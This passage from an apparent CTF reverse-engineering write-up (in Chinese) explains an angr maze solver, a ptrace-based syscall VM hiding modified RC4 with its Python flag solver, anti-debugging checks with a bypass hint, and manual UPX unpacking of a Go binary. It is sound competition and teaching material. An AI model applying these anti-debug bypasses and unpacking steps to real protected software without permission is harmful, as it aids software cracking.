class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">64</span>)<br>state.memory.store(steps.rebased_addr, key_value)<br>state.memory.store(key.rebased_addr, key_value)<br><br><span class="hljs-comment"># 使用我们自己的`ExplorationTechnique`</span><br>tech = MazeWalker(<br>    (maze_walk.rebased_addr, maze_walk.rebased_addr + maze_walk.size),<br>    current.rebased_addr,<br>    maze_final.rebased_addr<br>)<br>simgr = proj.factory.simgr(state)<br>simgr.use_technique(tech)<br><br><span class="hljs-comment"># 运行直到产生 `found` stash</span><br>simgr.run()<br>simgr.remove_technique(tech)<br><br><span class="hljs-comment"># 继续运行直到输出flag</span><br><span class="hljs-built_in">print</span>(<br>    proj.factory<br>    .simgr(simgr.found[<span class="hljs-number">0</span>])<br>    .run()<br>    .deadended[<span class="hljs-number">0</span>]<br>    .posix.dumps(<span class="hljs-number">1</span>)<br>)<br></code></pre></td></tr></table></figure><h3 id="生成"><a class="markdownIt-Anchor" href="#生成"></a> 生成</h3><p>从<a href="assets/maze.zip">这里</a>查看生成二进制文件的源代码。控制流的生成使用了<a href="https://github.com/numba/llvmlite">llvmlite</a>库，在Linux下运行<code>./maze.py</code>即可生成<code>maze</code>可执行文件，在windows下运行时也可以生成<code>maze.exe</code>，但是它没有生成<code>maze.pdb</code>导致最终二进制没有符号信息。</p><h3 id="类似"><a class="markdownIt-Anchor" href="#类似"></a> 类似</h3><p><a href="https://zzzzsky.com/2021/12/09/networkx%E8%A7%A3%E5%86%B3CTF_RE%E5%9B%BE%E9%97%AE%E9%A2%98/">networkx解决CTF_RE图问题</a></p><h2 id="magical_syscall"><a class="markdownIt-Anchor" href="#magical_syscall"></a> magical_syscall</h2><h3 id="几个要点"><a class="markdownIt-Anchor" href="#几个要点"></a> 几个要点</h3><h4 id="_init_array"><a class="markdownIt-Anchor" href="#_init_array"></a> _init_array</h4><p>_init_array是程序的初始化列表，其中注册的函数会在main函数开始之前被调用。</p><h4 id="两个简单的反调试"><a class="markdownIt-Anchor" href="#两个简单的反调试"></a> 两个简单的反调试</h4><p>在初始化列表里注册了两个反调试函数。</p><p>一个是通过检查<code>/proc/self/status</code>文件中<code>TracePid</code>内容，判断是否被调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">nsigned __int64 <span class="hljs-title function_">sub_128C</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;/proc/self/status&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = fgets(v4, <span class="hljs-number">256</span>, stream); i; i = fgets(v4, <span class="hljs-number">256</span>, stream) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(v4, <span class="hljs-string">&quot;TracerPid&quot;</span>) )<br>    &#123;<br>      v1 = <span class="hljs-built_in">strlen</span>(v4);<br>      <span class="hljs-keyword">if</span> ( atoi(&amp;v4[v1 - <span class="hljs-number">3</span>]) )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;debugger detected, exit...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>另一个是自定义了signal handler，并在程序运行10s后alarm，即当程序运行超过10s后会直接退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_1253</span><span class="hljs-params">()</span><br>&#123;<br>  signal(<span class="hljs-number">14</span>, handler);<br>  signal(<span class="hljs-number">5</span>, (<span class="hljs-type">__sighandler_t</span>)sub_1236);<br>  <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0xA</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于这不是这道题的重点，所以没有在这为难大家，只是让大家了解一下。至于绕过只要给exit扬了就行。alarm信号在IDA调试时也可以直接忽略。</p><h4 id="ptrace"><a class="markdownIt-Anchor" href="#ptrace"></a> Ptrace</h4><p>​ptrace是linux的一个系统调用，一个进程可以通过ptrace查看甚至控制另一个进程的内部状态。大名鼎鼎的调试器gdb就是基于ptrace实现的，这里推荐一篇<a href="https://xz.aliyun.com/t/6882">文章</a></p><p>ptrace函数是C标准库对ptrace syscall的封装，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span>       </span><br><span class="hljs-type">long</span> <span class="hljs-title function_">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span>;<br></code></pre></td></tr></table></figure><ul><li>request：要进行的ptrace操作</li><li>pid：要操作的进程号</li><li>addr：要监控/修改的内存地址</li><li>data：要读取/写入的数据变量</li></ul><p>常见的request操作可以看<a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">这</a></p><p>详细解释</p><ul><li><p>ptrace系统调⽤提供了⼀个进程(<code>tracer</code>)可以控制另⼀个进程(<code>tracer</code>)运⾏的⽅法，并且 <code>tracer</code> 可以监控和修改 <code>tracer</code> 的内存和寄存器，主要⽤作实现断点调试和系统调⽤追踪。</p></li><li><p>当⽗进程使⽤ <code>ptrace</code> 函数并传递 <code>PTRACE_SYSCALL</code> 参数来监控⼦进程时，它会暂停⼦进程的执行并等待下⼀个系统调⽤。</p></li><li><p>具体来说，当子进程调⽤⼀个系统调⽤并引发⼀个中断时，⽗进程会收到⼀个 <code>SIGTRAP</code> 信号，并可以通过 <code>waitpid</code> 函数等待⼦进程进⼊暂停状态。此时，⽗进程可以使⽤ <code>ptrace</code> 函数再次传 递 <code>PTRACE_SYSCALL</code> 参数来恢复⼦进程的执⾏，并让子进程继续进⾏系统调用。</p></li><li><p>在这种情况下，父进程不会修改子进程的寄存器或内存值，只是简单地等待并恢复子进程的执行。这 个过程可以反复进行，直到子进程结束或父进程选择终止跟踪操作。</p></li></ul><h4 id="fork"><a class="markdownIt-Anchor" href="#fork"></a> fork</h4><ul><li><p>fork是linux的一个系统调用，用来根据当前进程创建子进程。</p></li><li><p>fork函数是C标准库对fork syscall的封装。值得关注的是函数的返回值。返回值小于0说明创建子进程失败，在子进程中，返回值为0，而在父进程中，返回值为子进程的进程号(pid)。在实际编程中常用if分支通过返回值来区分父子进程，执行不同的代码。</p></li></ul><h4 id="user_regs_struct"><a class="markdownIt-Anchor" href="#user_regs_struct"></a> user_regs_struct</h4><p>这是一个定义了一系列寄存器的结构体，本身是专门为gdb写的，想看详细内容的话可以在C源文件里写一句<code>#include &lt;sys/user.h&gt;</code>，然后戳进去看就行了。</p><p>这个东西在进行ptrace操作(读写内存、寄存器)时很有用，可以在IDA里导入这个结构体方便分析。</p><ul><li><p>导入结构体前</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307181650024.png" alt="image-20230718165027981" /></p></li><li><p>导入后</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307181651189.png" alt="image-20230718165100151" /></p></li></ul><h4 id="通过ptrace自定义syscall"><a class="markdownIt-Anchor" href="#通过ptrace自定义syscall"></a> 通过ptrace自定义syscall</h4><p>syscall的过程是代码从用户态进入内核态的过程。如果我们把用户态换成子进程，内核态换成父进程，通过ptrace进行父进程对子进程内存空间的读写，模拟内核执行代码时的数据处理，就能实现自定义syscall。这是理解这道题运行逻辑的核心。</p><p><a href="https://filippo.io/linux-syscall-table/">常见的系统调用号</a></p><p>对应Syscall的过程可以参考<a href="https://blog.csdn.net/yanbw/article/details/123076039">syscall过程</a></p><h3 id="程序运行逻辑"><a class="markdownIt-Anchor" href="#程序运行逻辑"></a> 程序运行逻辑</h3><p>下面按顺序梳理一下整个程序的运行逻辑</p><p>首先fork出子进程，子进程执行tracee函数，父进程执行tracer函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1D8B</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v1 = fork();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to creat subprocess&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v1 )<br>    tracer(v1);<br>  <span class="hljs-keyword">return</span> tracee();<br>&#125;<br></code></pre></td></tr></table></figure><p>子进程进入tracee函数，先ptrace TRACEME告诉操作系统自己要被父进程追踪，然后发送SIGCONT信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1386</span><span class="hljs-params">()</span><br>&#123;<br>  ptrace(PTRACE_TRACEME, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> raise(SIGCONT);<br>&#125;<br></code></pre></td></tr></table></figure><p>父进程进入tracer函数，先通过waitpid函数等待子进程SIGCONT信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)stat_loc != <span class="hljs-number">127</span> ) <span class="hljs-comment">// !WIFSTOPPED(status) 如果子进程不是正常退出的，则进入if分支</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;debugger detected, exit...&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>ptrace(PTRACE_SETOPTIONS, a1, <span class="hljs-number">0LL</span>, PTRACE_O_EXITKILL); <span class="hljs-comment">// 如果子进程处于退出状态，则kill掉父进程</span><br></code></pre></td></tr></table></figure><p>下面就是父进程中一个非常大的while循环，里面定义了一系列syscall，if判断的条件则是上面介绍的user_regs_struct里的<code>orig_rax</code>，即自定义syscall的系统调用号。</p><p>还有一个要点就是在while循环的开头和结尾都有这一句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><p>用处是使子进程在每次syscall开始和结束时停下，把控制权交给父进程进行相应操作。</p><p>到这有一点要明确，父进程会一直在while循环里呆着，永远也不会执行到main函数，而只有子进程真正去执行main函数代码。父进程最终会走到以下两个分支之一得以退出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">8888</span> )                         <span class="hljs-comment">// FAIL</span><br>  <span class="hljs-keyword">break</span>; <br><span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">9999</span> )                         <span class="hljs-comment">// SUCCESS</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;congratulations&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>即程序最后check成功或失败的判断。</p><p>子进程执行的main函数非常简洁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input your flag:&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    syscall(<br>      (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[pc + <span class="hljs-number">468</span>],<br>      (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[pc + <span class="hljs-number">1</span> + <span class="hljs-number">468</span>],<br>      (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[pc + <span class="hljs-number">2</span> + <span class="hljs-number">468</span>],<br>      (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[pc + <span class="hljs-number">3</span> + <span class="hljs-number">468</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>打印提示信息后，只有一个死循环，里面不断去执行syscall，正是这里执行的syscall会被父进程拦截并进行相应操作，syscall的参数即分别为系统调用号和所需参数。有些自定义的syscall并不需要3个参数，但由于这里并不会修改这些值，所以传几个多余的参数不会有任何影响。</p><h3 id="vm逆向"><a class="markdownIt-Anchor" href="#vm逆向"></a> VM逆向</h3><p>有经验的逆向壬应该一眼vm了，以上内容不关心靠猜也能七七八八。</p><p>这道题中vm的突破点应该在变量的识别。首先pc应该很容易看出来，毕竟每个syscall之后都会把它加上2或3或4，即那条指令的长度。其次是导入user_regs_struct之后就可以比较清晰的看懂几个参数了。</p><p>然后通过几个syscall对比来看应该也能看出来一些特殊的指令。</p><p>比如完全对称的push和pop：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3904</span> )                         <span class="hljs-comment">// PUSH</span><br>    &#123;<br>      dword_40B4 = ptrace(PTRACE_PEEKDATA, a1, &amp;dword_40B4, <span class="hljs-number">0LL</span>);<br>      dword_40AC[++dword_40A4 + <span class="hljs-number">4</span>] = dword_40B4;<br>      ++pc;<br>      ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3905</span> )                         <span class="hljs-comment">// POP</span><br>    &#123;<br>      dword_40B4 = dword_40AC[dword_40A4-- + <span class="hljs-number">4</span>];<br>      ++pc;<br>      ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>    &#125;<br></code></pre></td></tr></table></figure><p>互相有联系的CMP、JE、JNE：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3906</span> )                         <span class="hljs-comment">// CMP</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( arg2 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( arg2 == <span class="hljs-number">1</span> )<br>          flag_zf = dword_40A8 == dword_40B4;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        flag_zf = dword_40B0 == arg3;<br>      &#125;<br>      pc += <span class="hljs-number">3</span>;<br>      ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3907</span> )                         <span class="hljs-comment">// JE</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( flag_zf )<br>      &#123;<br>        pc = arg2;<br>        ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)arg2);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        pc += <span class="hljs-number">2</span>;<br>        ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3908</span> )                         <span class="hljs-comment">// JNE</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( flag_zf )<br>      &#123;<br>        pc += <span class="hljs-number">2</span>;<br>        ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        pc = arg2;<br>        ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)arg2);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后基本就能看出来像<code>dword_40B0</code>这样的是一些通用寄存器(ax、bx、cx…)</p><p>再往下就是一些计算类的指令，比如INC、MOD、XOR、RESET(置零)应该也不难看出</p><p>难度较大的应该是ADD、MOV指令，因为这俩实际做的事取决于参数，会对不同的寄存器/内存地址进行ADD、MOV操作，这里就需要认真对参数进行分析，搞清楚具体的指令的含义。</p><p>整个VM实际实现了一个RC4加密，然后和密文比较的过程，出题时写的伪汇编看<a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Challenges/magical_syscall/src/assembly.txt">这里</a></p><p>另一个点在于XCHG指令，即实现两个值的交换，但这里因为并没有使用临时变量存储其中一个变量原先的值，所以是个假的交换，相当于<code>a = b; b = a;</code>这样的操作，这也是RC4的魔改点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( arg1 == <span class="hljs-number">3912</span> )                         <span class="hljs-comment">// XCHG</span><br>&#123;<br>  *((_DWORD *)&amp;mem + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40B0) = *((_DWORD *)&amp;mem + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[<span class="hljs-number">0</span>]);<br>  *((_DWORD *)&amp;mem + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40AC[<span class="hljs-number">0</span>]) = *((_DWORD *)&amp;mem + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_40B0);<br>  ++pc;<br>  ptrace(PTRACE_POKEDATA, a1, &amp;pc, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pc);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">s, key, key_len</span>):<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + key[i%key_len])%<span class="hljs-number">256</span><br>        <span class="hljs-comment"># tmp = s[i]</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_generate_keystream</span>(<span class="hljs-params">s, length</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    key_stream = []<br>    <span class="hljs-keyword">while</span> length:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>    <span class="hljs-comment"># 可以保证每256次循环后s盒中的每个元素至少被交换一次</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        <span class="hljs-comment"># tmp = s[i]</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        key_stream.append(s[(s[i] + s[j]) % <span class="hljs-number">256</span>])<br>        length -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> key_stream<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;MiniLCTF2023&quot;</span>]        <span class="hljs-comment"># 准备一些变量</span><br>    key_len = <span class="hljs-built_in">len</span>(key)<br>    <span class="hljs-comment"># enc = [ord(i) for i in &quot;llac$ys_laci9am_ht1w_en1hc@m_l@utr1v_a&quot;]</span><br>    enc = [<span class="hljs-number">147</span>, <span class="hljs-number">163</span>, <span class="hljs-number">203</span>, <span class="hljs-number">201</span>, <span class="hljs-number">214</span>, <span class="hljs-number">211</span>, <span class="hljs-number">240</span>, <span class="hljs-number">213</span>, <span class="hljs-number">177</span>, <span class="hljs-number">26</span>, <span class="hljs-number">84</span>, <span class="hljs-number">155</span>, <span class="hljs-number">80</span>, <span class="hljs-number">203</span>, <span class="hljs-number">176</span>, <span class="hljs-number">178</span>, <span class="hljs-number">235</span>, <span class="hljs-number">15</span>, <span class="hljs-number">178</span>, <span class="hljs-number">141</span>, <span class="hljs-number">47</span>, <span class="hljs-number">230</span>, <span class="hljs-number">21</span>, <span class="hljs-number">203</span>, <span class="hljs-number">181</span>, <span class="hljs-number">61</span>, <span class="hljs-number">215</span>, <span class="hljs-number">156</span>, <span class="hljs-number">197</span>, <span class="hljs-number">129</span>, <span class="hljs-number">63</span>, <span class="hljs-number">145</span>, <span class="hljs-number">144</span>, <span class="hljs-number">241</span>, <span class="hljs-number">155</span>, <span class="hljs-number">171</span>, <span class="hljs-number">47</span>, <span class="hljs-number">242</span>]<br>    enc_len = <span class="hljs-built_in">len</span>(enc)<br>    cipher = [<span class="hljs-number">0</span>] * enc_len<br><br>    s = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]    <span class="hljs-comment"># 初始化s盒</span><br>    rc4_init(s, key, key_len)      <span class="hljs-comment"># 使用key打乱s盒</span><br>    key_stream = rc4_generate_keystream(s[:], enc_len) <span class="hljs-comment"># 生成密钥流</span><br>    <span class="hljs-comment"># print(key_stream)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(enc_len):     <span class="hljs-comment"># 逐字节异或加密</span><br>        cipher[i] = enc[i] ^ key_stream[i]<br>    cipher = cipher[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher))<br>    <span class="hljs-comment"># print(cipher)</span><br>    <span class="hljs-comment"># print(len(cipher))</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="巅峰极客"><a class="markdownIt-Anchor" href="#巅峰极客"></a> 巅峰极客</h1><h2 id="g0re"><a class="markdownIt-Anchor" href="#g0re"></a> g0Re</h2><h3 id="upx脱壳"><a class="markdownIt-Anchor" href="#upx脱壳"></a> UPX脱壳</h3><p>​可以用 DIE 检测出来是 go程序 和 UPX 壳，但是工具脱不了，只有手动脱壳，<a href="https://xz.aliyun.com/t/6881">参考</a>获得 <code>dumpfile</code> 文件</p><h3 id="go逆向"><a class="markdownIt-Anchor" href="#go逆向"></a> go逆向</h3><p>​首先分析go中的最后flag比对处，根据动调可以发现这里将一个 <code>base64</code> 加密的结果和字符串<code>wvgitbygwbk2b46d</code>进行相加之后再异或。之后根据 IDA 的插件感觉加密方式为 <code>AES</code> 加密，上面的字符串就是密钥。</p><p>​这里进行动调，首先锁定之后出现的那个 base64 的可疑字符，记住其地址，加硬件断点，之后直接动调(动调记得把其余的线程暂停suspended，否则程序会跳转到很奇怪的地方去)。观察硬件断点的变化。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307212201006.png" alt="image-20230721220157932" /></p><p>​这里发现可能就是变表的base64加密，之后提取改变的base64表。之后得到了这个 <code>main_sub_12da08()</code> 函数在进行base64加密的操作。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307212202817.png" alt="image-20230721220252766" /></p><p>​然后又有动调分析了 <code>main_io_read()</code> 函数是得到了密钥， <code>runtime_stringtoslicebyte()</code> 函数知识将输入加到了密钥后面，则动调分析比对之前仅剩的 <code>main_sub_53d398()</code> 函数，发现其中有一个 <code>crypto_aes_NewCipher()</code> 函数，肯定了 <code>AES</code> 加密的猜想，之后再动调分析。 这里动调没有找到输入点，这里对于go的逆向还是有点菜，再接再厉。</p><h3 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 